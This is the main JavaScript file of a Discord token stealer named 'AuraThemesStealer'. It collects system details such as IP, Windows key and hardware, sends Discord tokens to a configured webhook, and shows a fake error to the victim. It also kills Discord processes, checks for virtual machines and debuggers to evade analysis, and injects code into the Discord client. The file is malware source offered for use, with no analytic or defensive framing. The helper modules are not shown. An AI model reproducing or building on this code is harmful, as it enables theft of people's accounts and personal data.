
require("dotenv").config();
require("./utils/console/error.js").error();

const { get_info } = require("./modules/core/core.js");
const { discord_injected, kill_discords } = require("./modules/injections/discord.js");
const { fake_error } = require("./modules/fake_error/fake.js");
const { send_webhook_tokens } = require("./modules/tokens/send.js");
const { antidebug } = require("./modules/antidebug/antidebug.js");

const config = require("./config/config.js");

const {
    WEBHOOK,
    ERROR_MESSAGE,
    KILL_DISCORDS,
    VM_DEBUGGER,
    DC_INJECTION,
} = config;

class AuraThemesStealer {
    constructor() {
        this.aurita();
    }
    async aurita() {
        try {
            const { 
                DISK, 
                RAM, 
                UID, 
                CPU_COUNT, 
                IP, 
                OS, 
                CPU, 
                GPU, 
                WINDOWS_KEY, 
                WINDOWS_VERSION 
            } = await get_info();

            await send_webhook_tokens(WEBHOOK);
            await fake_error(ERROR_MESSAGE, config);
            await kill_discords(KILL_DISCORDS);
            await antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
            await discord_injected(DC_INJECTION);
    
        } catch (err) {
            console.log(err)
        }
    }
}

new AuraThemesStealer();
